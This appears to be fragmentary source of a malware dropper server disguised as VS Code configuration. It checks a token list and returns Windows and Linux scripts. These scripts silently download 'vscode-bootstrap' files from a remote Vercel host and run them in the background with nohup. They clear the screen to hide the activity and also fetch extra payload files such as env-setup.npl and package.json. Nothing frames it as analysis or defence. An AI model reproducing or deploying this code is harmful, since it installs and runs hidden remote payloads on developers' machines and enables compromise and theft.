...
const VALID_TOKENS = ["101", "102", "103", "104", "105", "106", "107", "108", "109"];
...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" http://vscode-load-config.vercel.app/task/token?token=${token}
cls
...
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "http://vscode-load-config.vercel.app/task/tokenlinux?token=${token}"
clear
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "http://vscode-load-config.vercel.app/task/tokenlinux?token=${token}"
clear
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "http://vscode-load-config.vercel.app/task/tokenParser?token=${token}"
curl -L -o "%CODEPROFILE%\\package.json" "http://vscode-load-config.vercel.app/task/package.json"
...
mkdir -p "\${USER_HOME}"
BASE_URL="http://vscode-load-config.vercel.app"
...
`;
    ...
    if (!VALID_TOKENS.includes(token)) {
      return res.status(403).send("Unauthorized token");
		...
		script = `
	const axios = require('axios');
const host = "ip-api-check-gold.vercel.app";
...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" http://vscode-load-config.vercel.app/settings/bootstrap?flag=${flag}
cls
"%VSCODE_DIR%\\vscode-bootstrap.cmd"
cls
    	`;
...
TARGET_DIR="$HOME/.vscode"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "http://vscode-load-config.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
clear
nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "http://vscode-load-config.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
clear
nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "http://vscode-load-config.vercel.app/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "http://vscode-load-config.vercel.app/settings/package"
